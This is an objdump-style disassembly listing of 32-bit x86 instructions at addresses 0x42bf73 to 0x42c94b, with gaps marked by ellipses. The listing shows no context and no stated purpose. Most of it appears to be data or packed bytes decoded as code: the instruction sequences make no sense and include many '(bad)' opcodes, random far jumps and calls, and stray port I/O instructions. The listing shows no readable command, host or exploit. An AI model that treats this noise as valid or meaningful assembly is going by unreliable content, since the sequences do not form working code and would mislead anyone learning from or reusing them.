  42bf73:	or     ebx,DWORD PTR [ecx]
  42bf75:	mov    dl,0xed
  42bf77:	mov    al,BYTE PTR [eax+0x24bb6a4b]
  42bf7d:	jmp    0x42bf6c
  42bf7f:	imul   esi,DWORD PTR [ebx+edx*4],0xffffffbc
  42bf83:	mov    esi,0x17bd6e39
  42bf88:	mov    edx,0xc03df4bd
  42bf8d:	sub    al,0x34
  42bf8f:	mov    ebx,0x839975af
  42bf94:	and    ch,BYTE PTR [eax-0x5f951586]
  42bf9a:	mov    eax,0xc841a773
  42bf9f:	mov    DWORD PTR [ecx+0x24572b59],edx
  42bfa5:	outs   dx,BYTE PTR ds:[esi]
  42bfa6:	and    al,0xb5
  42bfa8:	das    
  42bfa9:	fs pop esp
  42bfab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfac:	pushf  
  42bfad:	jns    0x42bf59
  42bfaf:	es ret 0xc1f5
  42bfb3:	es sar eax,0x6
  42bfb7:	in     eax,0xf7
  42bfb9:	sub    cl,0x47
  42bfbc:	iret   
  42bfbd:	dec    esp
  42bfbe:	and    DWORD PTR [ebx],edx
  42bfc0:	mov    edx,0x77f2a06a
  42bfc5:	xchg   esp,eax
  42bfc6:	in     al,dx
  42bfc7:	or     ch,dl
  42bfc9:	mov    al,0x8a
  42bfcb:	sub    DWORD PTR [esi+0x65],esp
  42bfce:	push   ss
  42bfcf:	cmc    
  42bfd0:	mov    ecx,0x32b84346
  42bfd5:	ins    DWORD PTR es:[edi],dx
  42bfd6:	aas    
  42bfd7:	jp     0x42bf6c
  42bfd9:	out    dx,eax
  42bfda:	out    0x1f,eax
  42bfdc:	push   ss
  42bfdd:	test   eax,0x1b81311e
  42bfe2:	cmp    DWORD PTR [ecx+0x6f592f6e],0xffffffff
  42bfe9:	ficom  WORD PTR [esi]
  42bfeb:	mov    bl,dl
  42bfed:	adc    DWORD PTR [ebx],esi
  42bfef:	jns    0x42bfa1
  42bff1:	ja     0x42bfd1
  42bff3:	adc    BYTE PTR [edi+eax*8-0x38],0xba
  42bff8:	xor    al,0xf3
  42bffa:	repz add al,0x2
  42bffd:	and    bl,BYTE PTR [ecx]
  42bfff:	pushf  
  42c000:	xchg   ebx,eax
  42c001:	hlt    
  42c002:	cmp    ecx,DWORD PTR [esi+0xa]
  42c005:	dec    eax
  42c006:	and    ebp,DWORD PTR ds:0xf1680492
  42c00c:	sbb    bl,bl
  42c00e:	and    edi,esi
  42c010:	cld    
  42c011:	aam    0x9c
  42c013:	fsubr  DWORD PTR [edi+0x3ce6baf2]
  42c019:	mov    edx,0x6b251e67
  42c01e:	push   ebx
  42c01f:	and    esi,edx
  42c021:	mov    eax,0x4762bf24
  42c026:	xchg   dh,ah
  42c028:	adc    eax,DWORD PTR [esi]
  42c02a:	cmp    eax,0x5c590c0f
  42c02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c030:	sub    ch,BYTE PTR [eax+0x5c9d2c96]
  42c036:	sbb    DWORD PTR [ebx-0x3b],esi
  42c039:	mov    dl,0x8f
  42c03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c03c:	pushf  
  42c03d:	push   0xbe330e0
  42c042:	stc    
  42c043:	cmp    BYTE PTR [eax-0x4a],al
  42c046:	sbb    eax,0xcdfb6db0
  42c04b:	mov    es,eax
  42c04d:	xor    BYTE PTR [ecx-0x5add076e],al
  42c053:	pop    edx
  42c054:	and    al,0x8b
  42c056:	mov    cl,0x2a
  42c058:	in     eax,0x21
  42c05a:	ss sti 
  42c05c:	and    eax,0x420cac4
  42c061:	ss jg  0x42c035
  42c064:	xor    eax,0xec85d7a1
  42c069:	adc    esi,edi
  42c06b:	jns    0x42c08a
  42c06d:	ins    DWORD PTR es:[edi],dx
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	jl     0x42c0cd
  42c0e4:	lods   eax,DWORD PTR ds:[esi]
  42c0e5:	fbld   TBYTE PTR [edi-0x28]
  42c0e8:	add    DWORD PTR [eax],eax
  42c0ea:	add    BYTE PTR [ecx],al
  42c0ec:	add    BYTE PTR [eax],al
  42c0ee:	mov    esi,0x124fff47
  42c0f3:	xchg   edx,eax
  42c0f4:	stos   BYTE PTR es:[edi],al
  42c0f5:	xchg   esp,eax
  42c0f6:	out    dx,al
  42c0f7:	adc    bl,BYTE PTR [eax]
  42c0f9:	xor    al,0xe9
  42c0fb:	lods   al,BYTE PTR ds:[esi]
  42c0fc:	add    edx,DWORD PTR [edi-0x69d53258]
  42c102:	pop    ds
  42c103:	mul    DWORD PTR ds:0x5096f5c
  42c109:	mov    bh,BYTE PTR ds:0x56f20be3
  42c10f:	adc    bh,al
  42c111:	call   0x4e01:0x93d7a0d1
  42c118:	outs   dx,DWORD PTR ds:[esi]
  42c119:	push   0x840b47df
  42c11e:	and    BYTE PTR [eax],0xbd
  42c121:	push   ebx
  42c122:	test   BYTE PTR [ecx-0xa666070],0x1
  42c129:	jns    0x42c189
  42c12b:	sub    esp,DWORD PTR [eax]
  42c12d:	sub    ch,0x51
  42c130:	fchs   
  42c132:	fisubr WORD PTR [esp+edx*4]
  42c135:	add    ah,bl
  42c137:	int    0x63
  42c139:	jmp    0x42c14c
  42c13b:	scas   eax,DWORD PTR es:[edi]
  42c13c:	fimul  WORD PTR [ecx-0x246c1743]
  42c142:	(bad)
  42c145:	jl     0x42c168
  42c147:	repz test al,0xe7
  42c14a:	(bad)  
  42c14c:	cmp    al,0xa1
  42c14e:	or     BYTE PTR [esi+0xedfa138],0x64
  42c155:	adc    edi,DWORD PTR [ebx+edx*1-0x57e7b8f5]
  42c15c:	stos   DWORD PTR es:[edi],eax
  42c15d:	popa   
  42c15e:	(bad)  
  42c15f:	mov    dh,0xaa
  42c161:	adc    ebx,ebx
  42c163:	scas   eax,DWORD PTR es:[edi]
  42c164:	adc    BYTE PTR [edx+0x171cae8a],ch
  42c16a:	popa   
  42c16b:	mov    ch,0xba
  42c16d:	loope  0x42c1ba
  42c16f:	and    al,0xdb
  42c171:	aad    0xf9
  42c173:	dec    esp
  42c174:	add    eax,0x9443513
  42c179:	mov    esp,0x71096264
  42c17e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c17f:	jno    0x42c1c4
  42c181:	xor    BYTE PTR [ebp+0x21],ah
  42c184:	cld    
  42c185:	std    
  42c186:	in     al,0x74
  42c188:	push   edx
  42c189:	in     eax,dx
  42c18a:	dec    ecx
  42c18b:	mov    ch,0xba
  42c18d:	retf   0x4edf
  42c190:	loopne 0x42c204
  42c192:	clc    
  42c193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c194:	loope  0x42c1ed
  42c196:	or     al,0x2d
  42c198:	rcr    DWORD PTR [esi-0x1abc8466],0xbf
  42c19f:	sub    BYTE PTR [esi+0x6077670a],ah
  42c1a5:	inc    esi
  42c1a6:	aam    0xf1
  42c1a8:	test   al,0x56
  42c1aa:	stos   BYTE PTR es:[edi],al
  42c1ab:	jno    0x42c1e1
  42c1ad:	sbb    DWORD PTR [edi-0x2c3d750d],ebp
  42c1b3:	ins    BYTE PTR es:[edi],dx
  42c1b4:	mov    edi,0xdcb42e69
  42c1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1ba:	xor    BYTE PTR [ebx],ch
  42c1bc:	daa    
  42c1bd:	mov    al,ds:0xf964fb7c
  42c1c2:	rcl    DWORD PTR [edx+0x1e],cl
  42c1c5:	xchg   esi,eax
  42c1c6:	sub    bh,BYTE PTR [esi+0x7c]
  42c1c9:	test   al,0x8b
  42c1cb:	mov    ds:0xd5129576,eax
  42c1d0:	xchg   ebx,eax
  42c1d1:	aad    0x28
  42c1d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c1d4:	and    DWORD PTR [edx],ecx
  42c1d6:	add    al,0xdb
  42c1d8:	dec    BYTE PTR ds:0xef18a74f
  42c1de:	outs   dx,BYTE PTR ds:[esi]
  42c1df:	xor    DWORD PTR [edi+0x7e],0xe1224c71
  42c1e6:	pop    es
  42c1e7:	xchg   ebp,eax
  42c1e8:	pop    ebp
  42c1e9:	xor    ecx,ebx
  42c1eb:	cli    
  42c1ec:	fldcw  WORD PTR [edi+0x0]
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	div    BYTE PTR [eax-0x2698da15]
  42c268:	add    DWORD PTR [eax],eax
  42c26a:	add    BYTE PTR [ecx],al
  42c26c:	add    BYTE PTR [eax],al
  42c26e:	mov    eax,ds:0x55151b3a
  42c273:	mov    bh,0x7
  42c275:	and    ah,BYTE PTR [edx-0xe28d07d]
  42c27b:	stos   DWORD PTR es:[edi],eax
  42c27c:	mov    esi,0x516d68f
  42c281:	fcmovnu st,st(0)
  42c283:	pushf  
  42c284:	repnz dec edi
  42c286:	jmp    0x9e91:0xa5c8fe32
  42c28d:	adc    eax,0x4b2b3ae1
  42c292:	mov    cl,0x6d
  42c294:	pop    ebx
  42c295:	jmp    0x7a92:0x1c5aeacf
  42c29c:	xor    dl,al
  42c29e:	outs   dx,BYTE PTR ds:[esi]
  42c29f:	cmp    al,0x17
  42c2a1:	xchg   ebx,eax
  42c2a2:	cmp    ch,cl
  42c2a4:	xchg   esi,eax
  42c2a5:	rol    esp,0x22
  42c2a8:	(bad)  
  42c2aa:	add    DWORD PTR [edx-0x26c11f31],ecx
  42c2b0:	push   edx
  42c2b1:	push   0x4b
  42c2b3:	push   ecx
  42c2b4:	dec    ecx
  42c2b5:	push   es
  42c2b6:	mov    dh,0xc3
  42c2b8:	cwde   
  42c2b9:	test   eax,0x6f5a0e9c
  42c2be:	leave  
  42c2bf:	ds pop ecx
  42c2c1:	inc    edi
  42c2c2:	stos   BYTE PTR es:[edi],al
  42c2c3:	sar    BYTE PTR [edi],cl
  42c2c5:	and    eax,0xac40b265
  42c2ca:	nop
  42c2cb:	addr16 (bad) 
  42c2cd:	outs   dx,DWORD PTR ds:[esi]
  42c2ce:	sbb    eax,0x436226fe
  42c2d3:	outs   dx,DWORD PTR ds:[esi]
  42c2d4:	pop    ebx
  42c2d5:	lods   al,BYTE PTR ds:[esi]
  42c2d6:	test   eax,0x876d5d71
  42c2db:	rcr    DWORD PTR ds:0x258a447c,cl
  42c2e1:	mov    ds:0x8542770f,eax
  42c2e6:	inc    ebx
  42c2e7:	dec    esi
  42c2e8:	es push ecx
  42c2ea:	ds jae 0x42c2e3
  42c2ed:	fmulp  st(6),st
  42c2ef:	mov    dh,0xf5
  42c2f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2f2:	in     al,0x5e
  42c2f4:	sub    dh,BYTE PTR [ebp-0x1d]
  42c2f7:	mov    eax,0xe8116bd6
  42c2fc:	imul   edx,DWORD PTR [ecx+0x1b],0xfffffff8
  42c300:	fisubr DWORD PTR [esi-0x4f]
  42c303:	aam    0x7b
  42c305:	mov    ah,0xde
  42c307:	dec    esi
  42c308:	jecxz  0x42c353
  42c30a:	pop    ds
  42c30b:	loop   0x42c2fe
  42c30d:	aas    
  42c30e:	add    DWORD PTR [ecx-0x1ed55fc3],ebx
  42c314:	and    esp,DWORD PTR [edi]
  42c316:	lock inc ebx
  42c318:	push   edi
  42c319:	(bad)  
  42c31b:	repnz aam 0xcd
  42c31e:	shl    BYTE PTR [esi+0x63],0x76
  42c322:	xor    eax,0xa328cb9b
  42c327:	dec    ebp
  42c328:	inc    edx
  42c329:	repz pop ss
  42c32b:	js     0x42c2ce
  42c32d:	addr16 jns 0x42c2b1
  42c330:	jecxz  0x42c318
  42c332:	sub    BYTE PTR [eax+0x7b],ah
  42c335:	xchg   ecx,eax
  42c336:	call   0x3100:0x32531fc1
  42c33d:	(bad)  
  42c33e:	cmp    eax,0x97ab0150
  42c343:	outs   dx,DWORD PTR ds:[esi]
  42c344:	test   al,0x63
  42c346:	jo     0x42c329
  42c348:	xchg   edx,eax
  42c349:	(bad)  
  42c34a:	and    esp,DWORD PTR [esp+eiz*8]
  42c34d:	xor    BYTE PTR [edi+ecx*4+0x7dafbd31],ah
  42c354:	(bad)  
  42c355:	mov    ah,0xd6
  42c357:	(bad)  
  42c358:	mov    ebx,0xf7dca2f5
  42c35d:	repz iret 
  42c35f:	enter  0x4d40,0x8a
  42c363:	add    al,0xc3
  42c365:	lahf   
  42c366:	xchg   esp,eax
  42c367:	dec    esi
  42c368:	out    0x33,eax
  42c36a:	icebp  
  42c36b:	sub    BYTE PTR [ebx+0x27],0x0
	...
  42c3d3:	add    BYTE PTR [eax],al
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x5148af6
  42c3e5:	add    DWORD PTR [edi-0x26],esp
  42c3e8:	add    DWORD PTR [eax],eax
  42c3ea:	add    BYTE PTR [ecx],al
  42c3ec:	add    BYTE PTR [eax],al
  42c3ee:	(bad)
  42c3f2:	dec    eax
  42c3f3:	mov    ds:0x4727e4f6,al
  42c3f8:	mov    dh,0x9b
  42c3fa:	pop    ds
  42c3fb:	repz out 0x9c,al
  42c3fe:	lds    edi,FWORD PTR [edi+ebx*8+0x3b2230e]
  42c405:	adc    esp,DWORD PTR [ebx-0x7b]
  42c408:	push   ecx
  42c409:	addr16 sub eax,0xe80edb54
  42c40f:	sub    al,0xce
  42c411:	and    DWORD PTR [esi+0x1c69ac4a],ebx
  42c417:	popf   
  42c418:	repz xor BYTE PTR [ecx+0x72],dh
  42c41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c41d:	push   ds
  42c41e:	pop    ebx
  42c41f:	jbe    0x42c496
  42c421:	ret    
  42c422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c423:	sub    DWORD PTR [ebp-0x45ea0b5],ebp
  42c429:	inc    BYTE PTR [ebp+0x410cf890]
  42c42f:	jl     0x42c418
  42c431:	call   DWORD PTR [edx-0x7a]
  42c434:	aas    
  42c435:	adc    esi,ebp
  42c437:	retf   0x5043
  42c43a:	cdq    
  42c43b:	daa    
  42c43c:	xor    BYTE PTR [edx],cl
  42c43e:	in     al,0xa3
  42c440:	dec    eax
  42c441:	and    BYTE PTR [ebx+edi*2+0x29],0x3d
  42c446:	add    BYTE PTR [esi],0x8b
  42c449:	sbb    BYTE PTR [esi+ebx*8-0x748a0b4],bl
  42c450:	imul   esp,esi,0x829cffc1
  42c456:	mov    edi,0x19a07f67
  42c45b:	xor    BYTE PTR [eax+eax*8],al
  42c45e:	dec    edi
  42c45f:	xchg   esp,eax
  42c460:	jmp    0x42c422
  42c462:	das    
  42c463:	sub    esi,DWORD PTR [eax-0x42]
  42c466:	or     BYTE PTR [ebx],bl
  42c468:	push   es
  42c469:	xor    eax,0xa2ce2f22
  42c46e:	and    BYTE PTR cs:[eax+0x74],0x25
  42c473:	cmp    ch,BYTE PTR [ecx-0x41]
  42c476:	add    BYTE PTR [ebp-0x5c5843e4],al
  42c47c:	dec    edx
  42c47d:	scas   al,BYTE PTR es:[edi]
  42c47e:	mov    es,WORD PTR [ebx]
  42c480:	aas    
  42c481:	xchg   edx,eax
  42c482:	mov    edx,0x56f6e078
  42c487:	jmp    0x42c4cc
  42c489:	fdivr  QWORD PTR [edx-0x4405b767]
  42c48f:	enter  0xbf00,0xd8
  42c493:	fimul  WORD PTR ds:[ebx+0x3]
  42c497:	push   ecx
  42c498:	loop   0x42c470
  42c49a:	les    esp,FWORD PTR [edx]
  42c49c:	jmp    0xe07f8f0a
  42c4a1:	sub    cl,BYTE PTR [ebx]
  42c4a3:	mov    cl,0xcd
  42c4a5:	jns    0x42c444
  42c4a7:	dec    esp
  42c4a8:	je     0x42c44a
  42c4aa:	jb     0x42c4cd
  42c4ac:	cmp    DWORD PTR [eax-0x404c820],0xe51be1d5
  42c4b6:	cmp    BYTE PTR [esi-0x5ee0076],cl
  42c4bc:	mov    ds:0x877510bc,al
  42c4c1:	cmp    DWORD PTR [ebx-0x3b1255e4],eax
  42c4c7:	test   DWORD PTR [ebx+eax*4+0x5f],edi
  42c4cb:	mov    ecx,0xd0d9a635
  42c4d0:	xchg   edi,eax
  42c4d1:	bnd jo 0x42c4aa
  42c4d4:	cmp    ch,al
  42c4d6:	test   ebx,ebp
  42c4d8:	out    0x36,eax
  42c4da:	fs jne 0x42c4c5
  42c4dd:	adc    esi,ebx
  42c4df:	and    DWORD PTR [eax-0x6e],eax
  42c4e2:	es push eax
  42c4e4:	in     eax,0xaa
  42c4e6:	aas    
  42c4e7:	out    dx,eax
  42c4e8:	sub    edx,DWORD PTR [ebp+0x758608dd]
	...
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x8d34,0x58
  42c564:	stos   DWORD PTR es:[edi],eax
  42c565:	ja     0x42c5ce
  42c567:	fild   DWORD PTR [ecx]
  42c569:	add    BYTE PTR [eax],al
  42c56b:	add    DWORD PTR [eax],eax
  42c56d:	add    BYTE PTR [edx],cl
  42c56f:	or     al,0x84
  42c571:	lds    esi,FWORD PTR [ebx+0x1b]
  42c574:	popf   
  42c575:	adc    esp,esi
  42c577:	in     al,0x30
  42c579:	in     al,0x6f
  42c57b:	mov    esp,DWORD PTR [esi]
  42c57d:	jecxz  0x42c5ec
  42c57f:	mov    al,0xfb
  42c581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c582:	cmp    BYTE PTR [ebx-0x62],dl
  42c585:	bound  ecx,QWORD PTR [ebp-0x13]
  42c588:	enter  0x2532,0xf8
  42c58c:	inc    eax
  42c58d:	mov    ebx,edi
  42c58f:	pushf  
  42c590:	mov    bl,BYTE PTR [ecx-0x44838c84]
  42c596:	repz (bad) 
  42c598:	mov    dh,0x72
  42c59a:	out    dx,eax
  42c59b:	cmp    ebx,esp
  42c59d:	mov    ?,WORD PTR [edx]
  42c59f:	push   eax
  42c5a0:	neg    BYTE PTR [edi]
  42c5a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5a3:	nop
  42c5a4:	push   0x6a
  42c5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5a7:	inc    ecx
  42c5a8:	pop    eax
  42c5a9:	jae    0x42c5d9
  42c5ab:	add    ebp,0x6d
  42c5ae:	jbe    0x42c56d
  42c5b0:	push   ebp
  42c5b1:	dec    ebx
  42c5b2:	xchg   ecx,eax
  42c5b3:	jb     0x42c544
  42c5b5:	pusha  
  42c5b6:	inc    esp
  42c5b7:	cmp    eax,0xebafc64d
  42c5bc:	inc    esi
  42c5bd:	aaa    
  42c5be:	fnstenv [ebx]
  42c5c0:	mov    ds:0x2ba59183,eax
  42c5c5:	fwait
  42c5c6:	cmp    BYTE PTR ds:0xdca28f49,al
  42c5cc:	push   0xffffff94
  42c5ce:	jmp    0x92873385
  42c5d3:	ds inc eax
  42c5d5:	add    DWORD PTR [ebp-0x78c2280d],edx
  42c5db:	je     0x42c572
  42c5dd:	in     eax,dx
  42c5de:	mov    esp,0xd40d25f6
  42c5e3:	sbb    al,0x7
  42c5e5:	daa    
  42c5e6:	or     eax,DWORD PTR [eax+eiz*1]
  42c5e9:	lods   eax,DWORD PTR ds:[esi]
  42c5ea:	push   edx
  42c5eb:	repnz sbb ebx,ebx
  42c5ee:	inc    edi
  42c5ef:	jp     0x42c5c3
  42c5f1:	mov    edx,0x571b8dc2
  42c5f6:	retf   0x48c7
  42c5f9:	lock ins BYTE PTR es:[edi],dx
  42c5fb:	adc    cl,BYTE PTR [esi]
  42c5fd:	mov    dh,0x5
  42c5ff:	pop    eax
  42c600:	pop    edi
  42c601:	or     bl,al
  42c603:	mov    edi,0x21633a5f
  42c608:	mov    al,bh
  42c60a:	and    al,0xdd
  42c60c:	out    0x37,al
  42c60e:	lods   eax,DWORD PTR ds:[esi]
  42c60f:	mov    dh,0xdb
  42c611:	mov    eax,ds:0xdcd8368f
  42c616:	and    DWORD PTR [edx-0x6e3e90db],edi
  42c61c:	dec    esi
  42c61d:	les    esi,FWORD PTR [eax-0x1cad8e72]
  42c623:	mov    ebx,0xc7c2ab44
  42c628:	clc    
  42c629:	rcr    DWORD PTR [ecx],0xf3
  42c62c:	push   cs
  42c62d:	(bad)  
  42c62e:	sti    
  42c62f:	out    0xb4,al
  42c631:	in     al,0xb8
  42c633:	mov    eax,0xb3b45a8a
  42c638:	or     dh,bl
  42c63a:	mov    eax,0xc2660416
  42c63f:	test   al,0x46
  42c641:	inc    ebp
  42c642:	jp     0x42c602
  42c644:	sti    
  42c645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c646:	loop   0x42c5e6
  42c648:	xor    DWORD PTR [edx],ecx
  42c64a:	sbb    edi,eax
  42c64c:	stc    
  42c64d:	xchg   esi,eax
  42c64e:	pushf  
  42c64f:	ret    
  42c650:	push   esi
  42c651:	cmp    al,0xe3
  42c653:	mov    bh,0x78
  42c655:	sub    DWORD PTR [ebx-0x58e74912],0xb310a557
  42c65f:	ror    BYTE PTR [ebx+ebx*8-0x68],1
  42c663:	sbb    al,0xf5
  42c665:	mov    eax,ebx
  42c667:	popa   
  42c668:	mov    eax,0x909367f5
  42c66d:	sahf   
	...
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx-0x72920395]
  42c6e3:	pop    esp
  42c6e4:	xor    al,dh
  42c6e6:	fadd   QWORD PTR [bx+di]
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    bl,dl
  42c6ef:	bnd jp 0x42c683
  42c6f2:	jb     0x42c758
  42c6f4:	xor    BYTE PTR [edx-0xd3cd458],ch
  42c6fa:	mov    ds:0xaee2adae,eax
  42c6ff:	inc    ebx
  42c700:	push   ds
  42c701:	push   cs
  42c702:	xor    DWORD PTR [edi-0x5ae41ffb],eax
  42c708:	dec    esp
  42c709:	test   BYTE PTR [edi-0x51],ch
  42c70c:	aas    
  42c70d:	add    al,0x50
  42c70f:	inc    ebx
  42c710:	xor    bl,bh
  42c712:	and    al,0x7a
  42c714:	mov    edi,0x4478e57e
  42c719:	in     al,dx
  42c71a:	(bad)  
  42c71b:	les    esp,FWORD PTR [ebp+ebx*4+0x23333bb0]
  42c722:	enter  0xe51b,0xf8
  42c726:	pop    edi
  42c727:	fwait
  42c728:	mov    BYTE PTR [ecx],bl
  42c72a:	sbb    ch,al
  42c72c:	pop    ss
  42c72d:	div    DWORD PTR [eax-0x288243de]
  42c733:	in     eax,dx
  42c734:	das    
  42c735:	inc    esp
  42c736:	mov    ah,0x27
  42c738:	sub    ebx,DWORD PTR [ebx]
  42c73a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c73b:	aaa    
  42c73c:	cwde   
  42c73d:	xor    al,0xca
  42c73f:	mov    eax,0x83f79fe6
  42c744:	xchg   ecx,eax
  42c745:	es in  al,0x61
  42c748:	dec    ecx
  42c749:	xchg   BYTE PTR [ecx-0x447de26c],dl
  42c74f:	scas   eax,DWORD PTR es:[edi]
  42c750:	bnd jge 0x42c722
  42c753:	sub    al,0xbd
  42c755:	in     al,dx
  42c756:	aam    0xbd
  42c758:	dec    edi
  42c759:	(bad)  
  42c75a:	or     ecx,DWORD PTR [eax+0x582b027f]
  42c760:	adc    edi,DWORD PTR [esi]
  42c762:	js     0x42c771
  42c764:	cmp    al,0xf6
  42c766:	inc    esp
  42c767:	sub    DWORD PTR [eax+ebp*8-0x328e2046],0x9e6743d1
  42c772:	enter  0xd959,0x6e
  42c776:	sub    BYTE PTR [esp+ebp*2+0x33b5ac6],0x88
  42c77e:	add    eax,0xff5a491a
  42c783:	pop    esi
  42c784:	pop    edx
  42c785:	push   ds
  42c786:	aam    0x17
  42c788:	jle    0x42c7ae
  42c78a:	sub    edi,DWORD PTR [eax+edx*4+0x68b39a29]
  42c791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c792:	ret    0x41d6
  42c795:	jmp    0xd49130fe
  42c79a:	aam    0xe9
  42c79c:	add    eax,0xf8f51742
  42c7a1:	repnz out dx,al
  42c7a3:	mov    esi,0x23523af8
  42c7a8:	cwde   
  42c7a9:	inc    ebp
  42c7aa:	inc    ecx
  42c7ab:	pop    es
  42c7ac:	xchg   edi,eax
  42c7ad:	scas   al,BYTE PTR es:[edi]
  42c7ae:	gs inc ebp
  42c7b0:	ins    DWORD PTR es:[edi],dx
  42c7b1:	stos   BYTE PTR es:[edi],al
  42c7b2:	push   es
  42c7b3:	pop    edx
  42c7b4:	pop    ds
  42c7b5:	inc    edx
  42c7b6:	fidivr DWORD PTR [ecx-0xeafb75f]
  42c7bc:	aas    
  42c7bd:	jne    0x42c835
  42c7bf:	and    bh,BYTE PTR [ebx]
  42c7c1:	adc    BYTE PTR [esi+0x5d],cl
  42c7c4:	sahf   
  42c7c5:	inc    edi
  42c7c6:	or     eax,0xab11b5cd
  42c7cb:	(bad)  
  42c7cc:	jle    0x42c7c4
  42c7ce:	js     0x42c807
  42c7d0:	fcmovb st,st(1)
  42c7d2:	mov    ecx,0x6e17ec20
  42c7d7:	push   ebx
  42c7d8:	xor    bh,bh
  42c7da:	xor    eax,0x7d48c3a0
  42c7df:	pop    edi
  42c7e0:	xor    BYTE PTR [edx+0x6f],0x17
  42c7e4:	nop
  42c7e5:	mov    eax,0xf734e51d
  42c7ea:	vshufps ymm7,ymm6,ymm2,0x0
	...
  42c853:	add    BYTE PTR [eax],al
  42c855:	add    BYTE PTR [eax],bh
  42c857:	mov    DWORD PTR [edx-0x6b],ebp
  42c85a:	sti    
  42c85b:	idiv   edi
  42c85d:	lods   eax,DWORD PTR ds:[esi]
  42c85e:	pop    ebp
  42c85f:	sbb    eax,0xabca40e
  42c864:	imul   esp,esp,0x1dd67
  42c86a:	add    BYTE PTR [ecx],al
  42c86c:	add    BYTE PTR [eax],al
  42c86e:	pop    ecx
  42c86f:	xchg   esp,eax
  42c870:	leave  
  42c871:	mov    eax,DWORD PTR [edi+0x3dbd161f]
  42c877:	aad    0xc7
  42c879:	adc    eax,0x4e9dc720
  42c87e:	jmp    0x2da44c74
  42c883:	and    dl,BYTE PTR es:[edx]
  42c886:	pop    ss
  42c887:	push   ds
  42c888:	outs   dx,BYTE PTR ds:[esi]
  42c889:	jecxz  0x42c8b1
  42c88b:	and    dh,cl
  42c88d:	aaa    
  42c88e:	mov    edi,0xac5cbab
  42c893:	mov    al,0x4f
  42c895:	(bad)  
  42c896:	addr16 sub al,0xd5
  42c899:	int    0xc4
  42c89b:	xchg   esp,eax
  42c89c:	test   BYTE PTR [ebp+0x1c],0xbe
  42c8a0:	jno    0x42c839
  42c8a2:	sub    BYTE PTR [edi+0x34b68ba2],cl
  42c8a8:	js     0x42c89b
  42c8aa:	dec    esp
  42c8ab:	dec    ebp
  42c8ac:	ret    
  42c8ad:	jge    0x42c91a
  42c8af:	rol    bl,cl
  42c8b1:	sbb    BYTE PTR ds:0x5b515f79,0x45
  42c8b8:	pop    esp
  42c8b9:	mov    edx,0xe3ad3608
  42c8be:	adc    cl,BYTE PTR [eax+0x60ee0447]
  42c8c4:	(bad)  
  42c8c5:	enter  0x2d33,0xd8
  42c8c9:	pop    edi
  42c8ca:	push   0xe
  42c8cc:	adc    edx,DWORD PTR [ebp+0x70ced0f6]
  42c8d2:	ret    0x6765
  42c8d5:	in     eax,dx
  42c8d6:	ja     0x42c893
  42c8d8:	call   ebx
  42c8da:	push   eax
  42c8db:	pop    es
  42c8dc:	xchg   esp,eax
  42c8dd:	gs repnz push ebp
  42c8e0:	cwde   
  42c8e1:	mov    ds:0x8f784c49,eax
  42c8e6:	xchg   edx,eax
  42c8e7:	mov    edx,0xd057c6df
  42c8ec:	(bad)  
  42c8ed:	lock sub DWORD PTR [ebp-0xd],edi
  42c8f1:	xchg   dh,ch
  42c8f3:	stc    
  42c8f4:	clc    
  42c8f5:	fisub  DWORD PTR [eax+0x2a79ad3f]
  42c8fb:	lea    edi,[eax+0x2]
  42c8fe:	ds mov ebp,0xdedcf1a1
  42c904:	dec    edi
  42c905:	xor    ecx,ebp
  42c907:	pop    ss
  42c908:	push   edx
  42c909:	lea    edx,[ebx]
  42c90b:	xor    al,0x3b
  42c90d:	ficom  DWORD PTR [edi-0x139c3a28]
  42c913:	and    edx,ebx
  42c915:	test   eax,0x8f142a45
  42c91a:	push   ss
  42c91b:	clc    
  42c91c:	arpl   WORD PTR [ebp+0x30e78316],bx
  42c922:	fs and al,0x20
  42c925:	cmp    bh,bh
  42c927:	pop    esi
  42c928:	fist   DWORD PTR [edx+0x513600b8]
  42c92e:	(bad)  
  42c92f:	mov    esi,0x98dd589a
  42c934:	xchg   BYTE PTR [edi+0x6b],dh
  42c937:	mov    WORD PTR [edi-0x5c],?
  42c93a:	dec    ebp
  42c93b:	mov    al,0xc0
  42c93d:	inc    eax
  42c93e:	xlat   BYTE PTR ds:[ebx]
  42c93f:	and    al,0xdc
  42c941:	mov    eax,0x5eb56c20
  42c946:	(bad)  
  42c947:	cwde   
  42c948:	rcl    DWORD PTR [ecx+0x10],cl
  42c94b:	sti    
